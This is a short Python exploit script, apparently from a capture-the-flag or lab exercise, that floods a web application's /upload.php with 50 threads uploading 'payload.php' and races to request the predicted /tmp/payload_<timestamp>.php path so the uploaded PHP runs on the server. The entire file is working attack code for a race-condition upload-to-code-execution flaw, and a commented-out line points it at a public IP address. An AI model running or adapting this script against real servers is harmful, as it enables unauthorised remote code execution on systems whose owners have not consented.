import time
import requests
from multiprocessing.dummy import Pool as ThreadPool

url = 'http://localhost:8282'
# url = 'http://14.225.255.41:8888'

current_timestamp = int(time.time())
new_timestamp = current_timestamp + 5

file_name = "payload.php"

proxies = {
    "http":"127.0.0.1:8080"
    }

def exploit(i):
    while True:
        with open(file_name, "rb") as file:
            response = requests.post(url=url+'/upload.php', files={"files": file}, proxies=None)
            print(response.content,new_timestamp)
        download_path = f"/tmp/payload_{new_timestamp}.php"
        download_url_with_timestamp = f"{url}{download_path}"
        response = requests.get(download_url_with_timestamp, proxies=None)
        if response.status_code == 200:
            print(response.content)
try:
    pool = ThreadPool(50)
    result = pool.map_async( exploit, (range(50)) ).get(10)

except Exception as e:
    pass